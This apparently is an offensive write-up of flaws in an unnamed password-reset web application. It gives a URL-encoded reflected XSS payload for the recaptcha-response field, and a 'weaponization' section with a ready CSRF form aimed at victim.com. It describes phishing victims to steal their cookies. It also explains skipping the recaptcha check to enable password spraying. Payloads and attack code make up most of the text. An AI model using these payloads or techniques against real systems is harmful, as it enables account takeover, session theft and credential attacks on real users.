I was unable to view the version of this application. However, here is a list of vulnerabilities for the application:

## Reflected XSS

I found 2 XSS Vulnerabilites on the following URLs:

```
PasswordReset/ChangePass/ChangeThePass
PasswordReset/Reset/Authenticate
```

You may use the following payload as a POST request to the URL to reflect the contents of recaptcha-response. Please change the domain name to the domain you are targetting.

```
command=Next&Username=%24dc1&DomainName=xxxx.xxxx&ReCaptchaPublicKey=6LxOW5_v5AH39Tex8cBG4b57&g-recaptcha-response=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%61%6c%65%72%74%28%31%29%3e&HomeUrl=%2FPasswordReset&X-Requested-With=XMLHttpRequest
```

## Weaponization

To abuse these POST Request Reflected XSS, you may pair it with a CSRF attack.

Create a page on your domain that you control with the following contents:
- Note: Change the form action URL to the target, and DomainName variable.

```js
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://victim.com/PasswordReset/Reset/Authenticate" method="POST">
      <input type="hidden" name="command" value="Next" />
      <input type="hidden" name="Username" value="&#36;dc1" />
      <input type="hidden" name="DomainName" value="ad&#46;&#46;" />
      <input type="hidden" name="ReCaptchaPublicKey" value="6LcgSVkaAAdOW5&#95;v5A19Tgfx68cB5b57" />
      <input type="hidden" name="g&#45;recaptcha&#45;response" value="<PAYLOAD>" />
      <input type="hidden" name="HomeUrl" value="&#47;PasswordReset" />
      <input type="hidden" name="X&#45;Requested&#45;With" value="XMLHttpRequest" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

Anything in the recaptcha response get's reflected. So you will send a phishing link to your victim to your website which will redirect the post request to the website, thus grabbing it's cookies.

I will leave it up to your imagination to do what you'd like with your payload. :)

## Recaptcha Bypass

Create a Login request, capture it in Burpsuite. Change the password or username in the post request and re-send it. Additionally, you may change the re-captcha response to whatever you'd like, meaning the server doesn't actually check it. This is great for password spraying for once you've done username enumeration.

